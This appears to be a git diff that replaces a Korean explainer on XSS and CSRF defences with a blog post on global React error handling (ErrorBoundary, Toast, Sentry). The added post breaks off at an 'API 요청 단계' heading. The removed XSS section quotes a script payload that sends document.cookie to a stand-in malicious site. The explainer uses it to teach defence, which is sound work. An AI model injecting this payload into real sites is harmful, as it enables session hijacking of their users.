@@ -1,119 +1,905 @@
-# 1. 프론트엔드 주요 보안 이슈, XSS와 CSRF
+# 들어가며
 
-프론트엔드 개발에서 보안은 간과하기 쉬운 영역이지만, 웹 애플리케이션의 안전성과 사용자 데이터를 보호하기 위해 필수적인 요소이다. 특히 크로스 사이트 스크립팅(XSS)과 교차 사이트 요청 위조(CSRF)는 프론트엔드에서 자주 발생하는 주요 취약점으로, 각각 브라우저와 웹사이트 간의 신뢰 관계를 악용한다는 공통점이 있다.
+현재 커피빵 프로젝트에 참여하고 있습니다.
 
-XSS는 "브라우저가 웹 사이트를 신뢰해서 생기는 취약점"이다. 사용자가 입력한 악성 스크립트가 브라우저에서 실행되면서, 사용자 세션 하이재킹이나 민감한 데이터 유출을 초래할 수 있다. 반면, CSRF는 "웹 사이트가 브라우저를 신뢰해서 생기는 취약점"이다. 공격자는 사용자가 인지하지 못한 상태에서 악의적인 요청을 웹 사이트로 전송하게 만들어, 사용자의 의도와 무관한 데이터 변경이나 작업이 이루어지도록 한다.
+저는 기능 구현도 중요하지만, 서비스 운영에서 가장 중요한 것은 **사용자에게 안정적인 경험을 제공하는 것**이라고 생각합니다.
 
-# 2. 크로스 사이트 스크립팅 (XSS)
+만약 에러 상황이 발생했을 때, 에러를 그대로 노출시키는 서비스가 있다면 어떨까요?
 
-## 2.1. XSS란?
+<img src="./images/1.png"/>
 
-크로스 사이트 스크립팅(XSS)은 웹 애플리케이션 보안에서 가장 흔하게 발견되는 취약점 중 하나로, 사용자 입력에 대한 적절한 검증 및 필터링이 부족할 때 발생한다. XSS는 웹 페이지에 삽입된 악성 스크립트가 브라우저에서 실행되도록 하여, 공격자가 사용자에게 부적절한 콘텐츠를 표시하거나, 사용자 권한을 가로채는 등의 악의적인 행동을 가능하게 한다. XSS는 주로 사용자가 신뢰하는 웹 사이트가 공격자의 악성 스크립트를 그대로 실행하도록 만드는 데 기인한다.
+저는 개인적으로 당황스럽고 해당 서비스에 대한 신뢰도가 떨어지게 되는데요.
 
-## 2.2. XSS의 공격 예시
+<br/>
 
-XSS 공격은 사용자가 방문한 웹사이트에서 악성 스크립트를 실행시키는 방식으로 이루어진다. 예를 들어, 공격자가 XSS 취약점이 존재하는 블로그에 게시글이나 댓글을 작성하면서 <script>alert('해킹됨');</script>와 같은 스크립트를 삽입했다고 가정해보자. 이 경우, 다른 사용자가 해당 페이지를 방문할 때 이 스크립트가 브라우저에서 실행되어 경고 창이 표시된다. 이 단순한 예시는 공격자가 악성 코드를 사용하여 웹사이트에서 무엇이든 실행할 수 있음을 보여준다.
+이에 대한 고민을 하던 중 **커피빵**에서는 현재 에러 핸들링에 대한 규칙이 없다는 것을 깨달았습니다.
 
-또 다른 예로, 한 쇼핑몰 사이트에서 리뷰 작성 기능이 있다고 가정해보자. 공격자가 리뷰 작성란에 <script>document.location='악성사이트?cookie='+document.cookie</script>와 같은 코드를 삽입한다면, 이 리뷰를 읽는 사용자의 세션 쿠키가 공격자의 사이트로 전송된다. 이 세션 쿠키를 통해 공격자는 사용자의 인증된 세션을 도용하여, 사용자의 계정에 접근하거나, 악의적인 행위를 할 수 있게 된다. 이러한 공격은 웹 애플리케이션에서 입력 데이터를 제대로 검증하지 않았을 때 발생할 수 있는 위험을 잘 보여준다.
+예상치 못한 에러가 발생했을 때 사용자에게 어떤 화면을 보여줄지, 개발자는 어떻게 에러를 추적하고 대응할지에 대한 일관된 전략이 필요하다고 느꼈습니다.
 
-## 2.3. XSS의 영향
+따라서 오늘은 커피빵 프로젝트에 적용할 **전역 에러 핸들링 전략**을 수립하고, 이를 통해 더 나은 사용자 경험을 제공하는 방법에 대해 정리해보려고 합니다.
 
-XSS는 다양한 방식으로 웹 애플리케이션과 사용자의 보안을 위협한다. 가장 심각한 문제는 세션 하이재킹이다. 공격자는 사용자의 세션 쿠키를 가로채어, 사용자가 로그인한 상태를 도용할 수 있다. 이를 통해 공격자는 사용자의 권한을 무단으로 획득하여, 민감한 데이터에 접근하거나, 계정을 임의로 조작할 수 있다.
+<br/>
 
-또한, XSS를 이용해 사용자의 브라우저에서 악성 코드를 실행함으로써 사용자의 시스템에 직접적인 피해를 줄 수도 있다. 예를 들어, 공격자는 XSS를 통해 키로거(Keylogger)나 피싱 공격을 실행하는 스크립트를 삽입할 수 있다. 이러한 스크립트는 사용자가 입력하는 모든 키 입력을 기록하거나, 사용자로 하여금 가짜 로그인 페이지에 로그인하도록 유도하여 자격 증명을 탈취할 수 있다.
+# 기존 에러 처리의 방식의 한계
 
-또한, XSS는 웹 애플리케이션의 신뢰도를 심각하게 저하시킬 수 있다. 공격자가 웹 사이트에 악성 콘텐츠를 삽입하면, 사용자는 해당 사이트를 신뢰하지 않게 되고, 이는 사이트의 평판에 큰 영향을 미친다. XSS는 단순히 기술적인 문제가 아니라, 사용자와 웹 애플리케이션 간의 신뢰 관계를 훼손하는 심각한 보안 위협으로 작용한다. 이러한 이유로 XSS는 모든 웹 개발자가 반드시 이해하고, 방어해야 하는 중요한 보안 이슈이다.
+기존에 커피빵에서 에러를 처리하는 방식을 살펴보면, 아래와 같은 문제가 있었습니다.
 
-## 2.4. XSS 취약점 대책
+### 1. `api` 요청 과정에서 발생한 에러 핸들링 방식이 모두 다릅니다.
 
-### 1. 입력 데이터의 검증
+기존 커피빵의 코드를 보면, 아래와 같습니다.
 
-사용자 입력 데이터의 검증은 XSS 방지를 위한 가장 중요한 단계 중 하나이다. 웹 애플리케이션은 모든 사용자 입력을 신뢰해서는 안 되며, 입력된 데이터가 악의적인 의도를 가지고 있을 가능성을 항상 염두에 두어야 한다. 따라서, 모든 사용자 입력은 반드시 철저하게 검증되고, 필터링되어야 한다.
+먼저, 미니 게임에 대한 정보를 **get** 요청으로 받아올 때의 코드입니다.
 
-첫 번째로, 사용자 입력을 HTML 콘텐츠에 직접 삽입하기 전에 특수 문자를 이스케이프 처리해야 한다. 이는 <, >, &, ", ' 등의 특수 문자가 HTML 태그나 속성으로 인식되는 것을 방지하기 위한 조치이다. 이러한 문자가 변환되지 않고 그대로 브라우저에 전달되면, 공격자가 삽입한 스크립트가 그대로 실행될 수 있기 때문이다. 예를 들어, <script> 태그와 같은 입력이 그대로 HTML에 삽입되면, 브라우저는 이를 스크립트로 인식하고 실행하게 된다. 이스케이프 처리를 통해 이러한 입력은 단순한 텍스트로 변환되어, 스크립트가 실행되지 않게 된다.
+```jsx
+ useEffect(() => {
+    (async () => {
+      try {
+        setLoading(true);
+        const _miniGames = await api.get<MiniGameType[]>('/rooms/minigame');
+        setMiniGames(_miniGames);
+      } catch (error) {
+        if (error instanceof ApiError) {
+          setError(error.message);
+        } else if (error instanceof NetworkError) {
+          setError('네트워크 연결을 확인해주세요');
+        } else {
+          setError('알 수 없는 오류가 발생했습니다');
+        }
+      } finally {
+        setLoading(false);
+      }
+    })();
+  }, []);
+```
 
-또한, 입력 데이터의 길이와 유형을 제한하는 것도 중요하다. 예를 들어, 이메일 주소나 전화번호와 같이 명확한 형식이 필요한 입력의 경우, 정규 표현식을 사용해 입력된 데이터가 기대하는 형식에 맞는지 검증할 수 있다. 이렇게 함으로써, 공격자가 의도적으로 악성 코드를 입력하는 것을 사전에 차단할 수 있다. 또한, 필요 이상으로 긴 입력을 허용하지 않음으로써, 악의적인 스크립트가 대규모로 삽입되는 것을 방지할 수 있다.
+반면 커피 메뉴를 받는 코드는 아래와 같습니다.
 
-마지막으로, 서버와 클라이언트 측에서 모두 검증을 수행하는 것이 바람직하다. 클라이언트 측 검증은 사용자 경험을 개선하고 빠른 피드백을 제공할 수 있지만, 이를 우회하는 방법이 존재하기 때문에 서버 측에서도 반드시 추가 검증이 이루어져야 한다. 서버 측 검증은 최종 방어선으로서, 클라이언트 측에서 처리되지 않은 악성 입력이 서버에 도달하는 것을 막아줄 수 있다. 이를 통해 잠재적인 XSS 공격의 위험을 최소화할 수 있다.
+```jsx
+useEffect(() => {
+    (async () => {
+      const menus = await api.get<Menu[]>(`/menu-categories/${selectedCategory.id}/menus`);
+      setMenus(menus);
+    })();
+  }, [selectedCategory]);
+```
 
-### 2. HTML 요소 속성의 보호
+어떤 곳은 **에러 처리를 전혀 하지 않고**, 어떤 곳은 **상태로 관리하며**, 또 다른 곳은 **다른 방식으로 처리**하는 등 일관성이 없습니다.
 
-HTML 요소 속성에 사용자 데이터를 삽입할 때는 특별한 주의가 필요하다. 속성 값에 사용자 입력이 직접 삽입될 경우, 이는 XSS 공격에 노출될 수 있는 경로가 된다. 예를 들어, 사용자가 입력한 데이터가 href, src, title 등의 속성 값으로 사용될 때, 이 데이터를 반드시 따옴표로 감싸고, 이스케이프 처리를 통해 특수 문자가 코드로 실행되지 않도록 해야 한다. 이를 통해 공격자가 악의적인 스크립트를 삽입하는 것을 효과적으로 방지할 수 있다.
+만약 이 모든 에러 처리를 한 곳에서 통합적으로 관리할 수 있다면, 코드의 응집성과 유지보수성이 크게 향상될 것입니다.
 
-특히 href 속성의 경우, 사용자가 입력한 URL이 http:나 https:로 시작하는지 확인해야 한다. 이를 통해 javascript:와 같은 악성 스키마가 사용되지 않도록 할 수 있다. 속성 값에 삽입되는 모든 입력 데이터는 신뢰할 수 없는 사용자로부터 입력된 것이므로, 철저한 검증과 필터링이 필요하다.
+<br/>
 
-### 3. DOM 조작 보호
+### 2. 예상하지 못한 에러에 대한 핸들링 방안이 없다.
 
-DOM 조작 시에도 XSS 공격에 대한 방어가 중요하다. 사용자의 입력을 동적으로 HTML 요소에 삽입할 때, innerHTML과 같은 메서드는 가능한 한 사용하지 않아야 한다. 이 메서드는 입력된 HTML 코드가 그대로 파싱되어 실행되기 때문에, 악의적인 스크립트가 포함될 수 있다. 대신, appendChild, textContent, createElement 등의 메서드를 사용해 DOM을 조작하는 것이 안전하다.
+`try-catch`문을 통해서 `api` 요청에 대한 에러 핸들링은 어느 정도 진행해 주고 있지만, 막상 렌더링 과정이나 그 외 예상치 못한 에러에 대한 핸들링을 진행해 주지 않고 있었습니다.
 
-이러한 메서드는 입력된 데이터를 단순한 텍스트로 처리하거나, 요소를 명확하게 생성해 삽입하기 때문에, 공격자가 악성 스크립트를 주입하는 것을 방지할 수 있다. 또한, DOM 조작 과정에서 사용자 입력이 HTML 속성에 들어가는 경우, 반드시 앞서 언급한 대로 이스케이프 처리와 검증을 수행해야 한다. 이렇게 하면 동적으로 생성된 콘텐츠도 안전하게 렌더링할 수 있다.
+따라서, 예상치 못한 에러 상황에서 사용자가 아래와 같은 에러 코드를 그대로 보게 되는 상황이 실제로 종종 발생했습니다.
 
-### 4. Content Security Policy(CSP) 적용
+<img src="./images/2.png" width="300px"/>
 
-Content Security Policy(CSP)는 XSS와 같은 공격을 방지하기 위한 강력한 보안 메커니즘이다. CSP는 웹 애플리케이션이 실행할 수 있는 콘텐츠의 출처를 제어하여, 악의적인 스크립트가 브라우저에서 실행되는 것을 차단한다. 이를 통해 개발자는 자신이 신뢰하는 출처에서만 스크립트를 불러올 수 있도록 제한할 수 있으며, 인라인 스크립트나 외부 소스에서 로드되는 스크립트의 실행을 막을 수 있다.
+이는 사용자 경험을 크게 해치는 요소가 됩니다.
 
-CSP를 적용할 때는 'unsafe-inline'과 같은 비안전한 지시자를 사용하지 않는 것이 중요하다. 대신 nonce-source나 hash-source를 사용하여 인라인 스크립트가 허용될 때도 안전하게 실행되도록 설정할 수 있다. 또한, 특정 리소스 유형에 대해 script-src, style-src, img-src 등의 지시자를 설정하여, 신뢰할 수 있는 출처에서만 해당 리소스를 로드하게끔 제어할 수 있다. 이를 통해 XSS를 포함한 다양한 코드 인젝션 공격을 예방할 수 있다.
+<br/>
 
-CSP는 테스트와 모니터링을 통해 지속적으로 개선되어야 한다. 초기에는 'Report-Only' 모드를 사용하여 CSP 설정이 제대로 작동하는지 확인하고, 문제점을 파악한 후에 실제 정책을 적용하는 것이 좋다. 또한, CSP는 설정 후에도 공격 시도가 발생할 경우 보고서를 수집하여, 새로운 위협에 대응할 수 있도록 지속적으로 관리해야 한다. 이렇게 함으로써, 웹 애플리케이션의 보안을 한층 강화할 수 있다.
+### 3. 에러 발생 시 사용자에게 일관된 경험을 제공하지 못한다.
 
-### 5. XSS 예방 라이브러리 사용
+동일한 API 에러가 발생해도 화면마다 다른 방식으로 표현되고 있었습니다.
 
-XSS를 효과적으로 방어하기 위해서는 검증된 라이브러리를 사용하는 것이 중요하다. DOMPurify와 같은 라이브러리는 사용자가 입력한 데이터를 철저히 필터링하여, 잠재적으로 위험한 HTML 태그와 속성을 제거함으로써 XSS 공격을 방지한다. 이 라이브러리는 사용하기 간편하면서도 강력한 보호 기능을 제공하여, 개발자가 안전하게 사용자 콘텐츠를 처리할 수 있도록 돕는다.
+- A 페이지: 토스트 메시지로 표시
+- B 페이지: 에러 텍스트로 표시
+- C 페이지: 아무런 피드백 없음
 
-DOMPurify는 다양한 설정 옵션을 제공하여 개발자가 애플리케이션의 요구에 맞게 필터링 규칙을 커스터마이즈할 수 있다. 예를 들어, 특정 태그나 속성만 허용하거나, 스크립트와 같이 악성 코드가 포함될 수 있는 요소를 완전히 제거하는 식으로 설정할 수 있다. 이를 통해 애플리케이션의 보안 수준을 높이고, 사용자가 악의적인 입력을 통해 시스템에 해를 끼치는 것을 방지할 수 있다.
+이러한 불일치는 사용자에게 혼란을 주고, 서비스의 완성도를 떨어뜨립니다. 따라서 서비스 전체에서 일관된 에러 UX가 필요합니다.
 
-최신 웹 브라우저에서 제공하는 Sanitizer API를 활용하는 것도 좋은 방법이다. Sanitizer API는 브라우저 내장 보안 기능으로, XSS와 같은 보안 위협으로부터 사용자를 보호하기 위해 고안되었다. 이 API는 브라우저 레벨에서 콘텐츠를 안전하게 처리하며, 사용자 입력을 DOM에 삽입하기 전에 자동으로 검증한다. 이러한 도구를 활용하면, 개발자는 XSS와 같은 취약점을 보다 효과적으로 방어할 수 있다.
+따라서, 이러한 문제점들을 해결하기 위해 **전역 에러 핸들링 체계**를 구축하고자 했습니다. 모든 에러를 공통된 방식으로 처리함으로써 개발자는 에러 처리 로직을 반복해서 작성할 필요가 없어지고, 사용자는 **어디서든 일관된 경험**을 받을 수 있게 됩니다.
 
-# 3. 교차 사이트 요청 위조 (CSRF)
+지금부터 커피빵 프로젝트에 적용할 구체적인 에러 핸들링 전략을 살펴보겠습니다.
 
-## 3.1. CSRF란?
+<br/>
 
-교차 사이트 요청 위조(CSRF)는 사용자가 신뢰하는 웹사이트에 대해, 사용자의 의도와는 다른 악의적인 요청을 수행하도록 유도하는 공격 기법이다. 이 공격은 사용자가 웹사이트에 이미 로그인된 상태에서 발생하며, 공격자가 사용자의 브라우저를 통해 웹사이트로 요청을 전송하게 만들어 서버가 이를 정상적인 요청으로 처리하도록 만든다. 결과적으로, 서버는 이러한 요청을 신뢰된 사용자로부터 온 것이라 간주하고, 사용자의 권한 하에 민감한 작업을 수행하게 된다.
+# 핸들링 해야 하는 에러
 
-CSRF 공격은 웹사이트가 사용자의 브라우저를 신뢰하는 점을 악용한다. 예를 들어, 사용자가 인터넷 뱅킹에 로그인한 상태에서 공격자가 준비한 악성 웹 페이지를 방문하면, 그 페이지는 사용자의 브라우저를 통해 이체 요청을 자동으로 전송할 수 있다. 이 과정에서 사용자는 자신의 계좌에서 돈이 이체된다는 사실을 전혀 인지하지 못한다. 이러한 공격은 사용자가 특정한 행동을 취하지 않더라도, 단순히 악성 페이지를 방문하거나, 공격자가 만든 링크를 클릭하는 것만으로도 실행될 수 있다.
+먼저 현재 프로젝트를 진행하면서 핸들링해야 하는 에러는 어떤게 있을지 생각해 보았습니다.
 
-## 3.2. CSRF의 공격 예시
+저는 많은 에러들 중에서 현재 저희 서비스에서 필수적으로 핸들링 해야 하는 에러는 아래 2가지가 있다고 생각했습니다.
 
-CSRF 공격의 한 예시는 사용자가 이미 로그인된 상태에서 특정 웹사이트의 악성 링크를 클릭하는 상황이다. 예를 들어, 공격자는 사용자가 자주 방문하는 포럼에 악성 링크를 게시할 수 있다. 이 링크는 사용자가 클릭하는 즉시, 그의 브라우저를 통해 인터넷 뱅킹 사이트에 자동 이체 요청을 보낸다. 사용자는 이 요청이 자신도 모르게 실행되었기 때문에, 자신의 계좌에서 자금이 이체되는 사실을 알지 못한다. 이처럼 CSRF 공격은 사용자의 인증 상태를 악용하여 의도하지 않은 작업을 수행하게 만든다.
+1. **HTTP 통신 과정에서 발생한 에러**
+2. **예상치 못한 에러**
 
-또 다른 예시로는, 공격자가 조작한 이메일 링크를 통해 CSRF를 실행하는 경우가 있다. 사용자가 링크를 클릭하면, 해당 링크는 사용자가 로그인된 상태인 전자 상거래 사이트에서 자동으로 주문을 생성하거나, 배송 주소를 변경하는 요청을 보낸다. 사용자는 이러한 변경 사항을 인지하지 못하고, 주문이 잘못된 주소로 배송되는 등 큰 피해를 입을 수 있다. 이러한 공격은 사용자가 자신의 브라우저에서 실행되는 모든 요청을 신뢰할 수 없다는 점을 명확히 보여준다.
+따라서 이와 관련된 에러를 핸들링하는 과정을 다룰 예정입니다.
 
-## 3.3. CSRF의 영향
+그 외 다른 에러(웹소켓 연결/통신이나 비즈니스 로직과 관련된 에러)들은 공통적으로 핸들링하기 어려운 부분이며, 이미 서비스 내부에서 개별적으로 처리되어 있다고 판단했기 때문에 이번 전략에서는 제외했습니다.
 
-CSRF는 사용자의 개인 정보와 자산을 심각하게 위협할 수 있는 취약점이다. 공격자는 CSRF를 통해 사용자가 의도하지 않은 작업을 수행하게 만들 수 있으며, 이는 웹 애플리케이션의 기능과 데이터 무결성에 큰 영향을 미친다. 예를 들어, 금융 서비스에서 CSRF 공격이 발생할 경우, 사용자의 자금이 무단으로 이체되거나, 중요한 계좌 정보가 변경될 수 있다. 이러한 피해는 경제적인 손실로 직결될 뿐만 아니라, 사용자의 신뢰를 완전히 잃게 만드는 원인이 된다.
+<br/>
 
-또한, CSRF는 소셜 미디어나 이메일 서비스에서도 큰 영향을 미칠 수 있다. 공격자는 CSRF를 통해 사용자의 계정으로 무단 게시물을 작성하거나, 사용자 모르게 비밀번호를 변경하여 계정을 탈취할 수 있다. 이로 인해 사용자는 자신의 온라인 정체성을 잃거나, 원치 않는 콘텐츠가 자신의 이름으로 퍼지게 되는 상황에 직면할 수 있다. 이러한 결과는 단순히 개인적인 피해를 넘어서, 사회적 신뢰와 평판에도 심각한 영향을 미친다. CSRF의 피해는 눈에 보이지 않게 누적되며, 문제를 인지한 후에는 이미 큰 피해가 발생한 경우가 많아, 이에 대한 예방이 무엇보다 중요하다.
+# 에러 핸들링 전략
 
-## 3.4. CSRF 취약점 대책
+따라서 각각의 에러에 유형에 대해 아래의 전략을 세웠습니다.
 
-### 1. CSRF 토큰 사용
+### **1. `HTTP API`와 관련된 에러**
 
-CSRF 방어의 핵심 전략 중 하나는 원타임 토큰(One-Time Token)을 활용하여 요청과 서버 간의 일치 여부를 검증하는 것이다. 이 토큰은 서버가 사용자 세션에 고유하게 생성한 값으로, 각 요청마다 포함되어야 한다. 서버는 요청을 처리하기 전에 이 토큰이 유효한지 확인한다. 이를 통해 서버는 요청이 사용자의 브라우저에서 직접 발생했는지, 또는 외부에서 조작된 것인지를 검증할 수 있다.
+**1-1) `GET` 메서드를 통헤 데이터 패칭에 실패한 경우**
 
-CSRF 토큰은 주로 폼에 숨김 필드로 포함된다. 사용자가 폼을 제출하면, 토큰이 함께 전송되어 서버에서 검증된다. 이렇게 함으로써 공격자가 외부에서 동일한 요청을 모방하더라도, 유효한 토큰이 없으면 요청이 처리되지 않는다. 이는 사용자가 정상적인 경로를 통해 요청을 보냈는지를 확인하는 중요한 보안 절차이다.
+`GET` 요청으로 데이터를 받아오는 과정에서 에러가 발생하면, 이는 **데이터 패칭에 실패**했다는 의미입니다.
 
-이 토큰은 단순한 값이 아니라, 복잡하고 예측 불가능한 값이어야 하며, 매 세션마다 변경되는 것이 바람직하다. 세션이 시작될 때마다 새로운 토큰이 생성되거나, 각 요청 시마다 새롭게 발급되어야 한다. 이렇게 하면 공격자가 특정 토큰을 획득하더라도 이를 재사용할 수 없게 되어, CSRF 공격의 성공 가능성을 크게 낮출 수 있다. 이는 CSRF 공격을 방지하는 데 있어 중요한 보안 계층을 추가하는 역할을 한다.화할 수 있다.
+<img src="./images/3.png" width="300px"/>
 
-### 2. SameSite Cookie 속성 사용
+예를 들어 위의 화면에서 에러가 발생한다면, 사용자들은 당연히 데이터를 다시 받아오고 싶을 것입니다.
 
-CSRF 공격을 방지하는 또 다른 중요한 방법은 쿠키의 SameSite 속성을 사용하는 것이다. 이 속성은 쿠키가 요청과 함께 전송되는 방식을 제어하여, 교차 사이트 요청이 쿠키를 포함할 수 없도록 제한한다. SameSite 속성은 Lax, Strict, 또는 None으로 설정할 수 있으며, 기본적으로는 Lax로 설정하여 대부분의 경우에 안전한 보호를 제공한다.
+**모든 `get` 요청에 대해 동일하다**고 생각하기 때문에, `get` 메서드를 통해 데이터를 패칭하는데 실패했다면, **지역적인 `Fallback UI`를 제공하여 데이터를 다시 받아올 수 있게끔 재시도**를 할 수 있도록 하고자 합니다.
 
-SameSite=Lax는 사용자가 링크를 클릭하거나 GET 요청을 통해 사이트를 탐색할 때 쿠키가 전송되도록 허용하지만, POST 요청과 같은 민감한 작업에는 쿠키가 포함되지 않도록 한다. 이는 사용자가 외부 사이트에서 특정 링크를 클릭하는 일반적인 사용 사례를 보호하면서도, CSRF 공격의 가능성을 줄이는 데 효과적이다. SameSite=Strict로 설정하면, 모든 외부 요청에 대해 쿠키가 전송되지 않아, CSRF 공격에 대한 보호가 더욱 강화된다.
+<br/>
 
-하지만, SameSite=Strict는 사용자 경험에 영향을 미칠 수 있어, 모든 상황에서 적합하지는 않다. 반면, SameSite=Lax는 보안과 사용자 경험의 균형을 잘 맞추는 옵션으로, 대부분의 웹 애플리케이션에서 권장된다. 특정 상황에서는 SameSite=None을 사용하여 쿠키가 교차 사이트 요청에서도 전송되도록 설정할 수 있지만, 이 경우 반드시 Secure 속성도 함께 사용하여 HTTPS 연결에서만 쿠키가 전송되도록 해야 한다. 이를 통해 CSRF 공격에 대한 강력한 방어를 유지하면서도, 필요한 경우 유연성을 제공할 수 있다.
+**1-2) get 이외의 메서드에서 요청이 실패 한 경우**
 
-### 3. Double Submit Cookie 기법
+이는 `get` 이외의 메서드 (`post`, `delete`, `patch`)의 요청이 실패한 경우입니다.
 
-Double Submit Cookie 기법은 CSRF 공격을 방어하기 위한 효과적인 방법 중 하나로, CSRF 토큰을 두 번 제출하는 방식을 사용한다. 이 기법에서는 서버가 사용자의 브라우저에 CSRF 토큰을 포함하는 쿠키를 발급하고, 클라이언트는 이 토큰을 폼 데이터나 요청 헤더에 포함시켜 서버에 다시 전송한다. 서버는 요청이 들어오면, 쿠키에 저장된 토큰과 폼이나 헤더에 포함된 토큰이 일치하는지 확인한다.
+<img src="./images/4.png" width="300px"/>
 
-이 방법은 서버가 CSRF 토큰을 관리하는 방식과 달리, 쿠키와 폼 데이터 간의 일치 여부를 검사하여 CSRF 공격을 방어한다. 공격자는 CSRF 토큰이 포함된 쿠키를 위조할 수 없으며, 일치하는 토큰 값을 알지 못하기 때문에, 이 기법은 CSRF 공격을 효과적으로 차단한다. 또한, 이 기법은 서버 측에서 특별한 상태 정보를 유지할 필요가 없어 구현이 비교적 간단하다.
+예를 들어, 위의 화면의 경우에 **방 만들러 가기**를 눌렀을 때, `post` 요청이 되는데요.
 
-하지만 Double Submit Cookie 기법은 쿠키의 보안 설정이 중요하다. 쿠키가 JavaScript에서 접근 가능하지 않도록 HttpOnly 속성을 사용해야 하며, Secure 속성을 통해 HTTPS 연결에서만 쿠키가 전송되도록 설정해야 한다. 이러한 보안 설정을 통해 쿠키가 클라이언트 측에서 노출되는 것을 방지하고, CSRF 공격에 대한 방어력을 더욱 강화할 수 있다.
+이때 사용자들은 에러가 나면 **내가 어떤 이유로 에러를 만났는지**를 궁금하게 될 텐데요. 따라서, 이때는 **`Toast`를 통해 에러의 원인을 명확하게 전달**하면 될 것 같습니다.
 
-### 4. 출처 검증
+`GET`과 달리 재시도를 위한 별도의 `Fallback UI`는 제공하지 않습니다. 사용자는 에러 원인을 확인한 후 필요하다면 동일한 액션을 다시 시도할 수 있기 때문입니다.
 
- CSRF 공격을 방지하는 또 다른 중요한 방법은 출처 검증(Origin Verification)이다. 출처 검증은 서버가 요청의 출처(Origin)와 Referer 헤더를 확인하여, 요청이 신뢰할 수 있는 출처에서 온 것인지 판단하는 방식이다. 웹 브라우저는 요청을 보낼 때 출처와 Referer 헤더를 자동으로 포함시키며, 서버는 이를 바탕으로 요청의 유효성을 검사할 수 있다.
+<br/>
 
-출처 검증은 특히 중요한 작업에서 유용하다. 예를 들어, 민감한 데이터 수정이나 결제 요청과 같은 작업에서 출처가 올바른지 확인함으로써, 외부 사이트에서 발생한 의도하지 않은 요청을 차단할 수 있다. 이 방법은 CSRF 공격을 사전에 방어하는 강력한 수단이 된다.
+### 2. 예상치 못한 에러
 
-이 방식의 핵심은, 서버가 허가된 출처 리스트를 유지하고, 그 리스트에 포함되지 않은 출처에서 온 요청은 모두 거부하는 것이다. 이를 통해, 공격자가 임의의 사이트에서 보내는 CSRF 요청이 효과를 발휘하지 못하도록 막을 수 있다. 그러나, Referer 헤더는 일부 환경에서 제거되거나 수정될 수 있으므로, 출처 검증은 CSRF 방어 전략의 하나로 사용되며, 다른 방법들과 함께 적용하는 것이 권장된다.
+예상치 못한 에러는 아래와 같이 분류할 수 있습니다.
+
+**2-1. 렌더링 관련 에러**
+
+컴포넌트 렌더링 중 발생할 수 있는 에러로는 `TypeError`, `ReferenceError` 등이 대표적입니다. 이는 다음과 같은 상황에서 발생할 수 있습니다.
+
+- API 응답 구조가 예상과 다를 때
+- 필수 데이터가 누락되었을 때
+- 잘못된 데이터 타입을 참조할 때
+
+이러한 경우를 핸들링 하기 위해 `ErrorBoundary`를 설정하고 해당 경우에 보여줄 `Fallback UI`를 설정하여 해당 `UI`를 보여주려고 합니다.
+
+**2-2. 그 외 예상치 못한 에러**
+
+실제 프로덕션 환경에서는 개발 단계에서 예측할 수 없는 다양한 에러가 발생할 수 있습니다.
+
+- 사용자가 개발자 도구로 DOM을 직접 수정하는 경우
+- 외부 서비스(CDN, 서드파티 라이브러리)의 장애
+- 특정 브라우저 환경에서만 발생하는 이슈
+
+이러한 경우에도 대응하기 위해 `Sentry`로 에러를 로깅하고 `ErrorBoundary`에서 `Fallback UI`를 보여줍니다.
+
+**정리하면**, `GET` 요청 실패는 재시도 `UI`를, 그 외 `HTTP` 에러는 `Toast`를, 예상치 못한 에러는 `ErrorBoundary`와 `Sentry`를 활용하여 처리합니다.
+
+<br/>
+<br/>
+
+# 에러 핸들링의 전체적인 구조
+
+위에서 정의한 다양한 에러 케이스들을 어떻게 공통적으로 처리할 수 있을까 고민한 끝에, `ErrorBoundary`를 활용하여 통합적으로 핸들링하기로 결정했습니다.
+
+<br/>
+
+## ErrorBoundary란?
+
+<aside>
+
+하위 컴포넌트 트리의 어디에서든 **자바스크립트 에러를 기록**하며 깨진 컴포넌트 트리 대신 `Fallback UI`를 보여주는 컴포넌트
+
+</aside>
+
+```tsx
+import * as React from 'react';
+
+class ErrorBoundary extends React.Component {
+  constructor(props) {
+    super(props);
+    this.state = { hasError: false };
+  }
+
+	// => 자식 컴포넌트에서 오류가 발생했을 때 호출
+  static getDerivedStateFromError(error) {
+    // state를 업데이트하여 다음 렌더링에 fallback UI가 표시되도록 합니다.
+    return { hasError: true };
+  }
+
+  // => render 이후의 side effects를 다루는 메서드
+  componentDidCatch(error, info) {
+    // 에러 기록
+    logErrorToMyService(
+      ...
+    );
+  }
+
+  render() {
+    if (this.state.hasError) {
+      // 사용자 지정 fallback UI를 렌더링할 수 있습니다.
+      return this.props.fallback;
+    }
+
+    return this.props.children;
+  }
+}
+```
+
+`React`의 `ErrorBoundary`는 클래스 컴포넌트에서 제공하는 기능으로, 각 메서드는 아래와 같은 역할을 합니다.
+
+<br/>
+
+1. **getDerivedStateFromError**
+
+```tsx
+static getDerivedStateFromError(error) {
+  // 다음 렌더링에서 Fallback UI를 표시하도록 상태 업데이트
+  return { hasError: true, error };
+}
+```
+
+- **실행 시점** : `render` 단계
+- **특징**: 순수 함수로 관리되어야 하며, 부수 효과(side effect)를 포함할 수 없음
+- **역할**: 자식 컴포넌트에서 에러가 발생했을 때 호출되어, Fallback UI를 렌더링하도록 상태를 업데이트
+
+<br/>
+
+2. **componentDidCatch**
+
+```tsx
+componentDidCatch(error, errorInfo) {
+  // 에러 로깅 서비스에 에러 정보 전송
+  logErrorToService(error, errorInfo);
+}
+```
+
+- **실행 시점**: `commit` 단계
+- **특징**: 부수 효과(side effect) 허용
+- **역할**: 에러 로그를 외부 서비스(Sentry 등)에 전송하거나, 에러 정보를 기록할 때 사용
+
+<br/>
+
+3. **render**
+
+```tsx
+render() {
+  if (this.state.hasError) {
+    // 에러 발생 시 Fallback UI 렌더링
+    return <ErrorFallbackUI error={this.state.error} />;
+  }
+
+  // 정상 상태에서는 자식 컴포넌트 렌더링
+  return this.props.children;
+}
+```
+
+- **역할**: 에러 상태에 따라 Fallback UI 또는 정상 컴포넌트를 렌더링
+- **동작**: `hasError` 상태가 `true`이면 에러 화면을 보여주고, `false`이면 자식 컴포넌트를 그대로 렌더링
+
+<br/>
+<br/>
+
+# 커피빵의 에러 핸들링 구조 설계하기
+
+커피빵에서는 에러를 효과적으로 처리하기 위해 **2개의 ErrorBoundary**를 계층적으로 사용하기로 했습니다.
+
+각각의 역할과 구조를 설명하겠습니다.
+
+<br/>
+
+## 전체 에러 처리의 흐름
+
+그 전에, 먼저 에러가 발생되고 처리되는 전체적인 흐름은 아래와 같습니다.
+
+<br/>
+
+### 1. API 요청 단계
+
